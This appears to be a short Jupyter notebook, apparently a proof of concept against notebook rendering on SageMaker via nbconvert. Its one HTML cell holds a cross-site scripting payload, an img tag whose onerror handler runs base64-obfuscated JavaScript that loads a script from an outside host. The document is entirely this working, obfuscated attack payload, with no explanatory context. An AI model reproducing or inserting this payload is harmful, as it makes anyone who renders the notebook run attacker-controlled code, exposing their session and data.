# %%
# %%html
# <img src=x onerror="eval(atob('...'))">
# Out:
# <img src=x onerror="eval(atob('d2l0aChkb2N1bWVudClib2R5LmFwcGVuZENoaWxkKGNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpKS5zcmM9J2h0dHBzOi8vcG9jLmhlbGk5LmNvbS9zYWdlbWFrZXIvbmJjb252ZXJ0X3JjZS5qcyc='))">
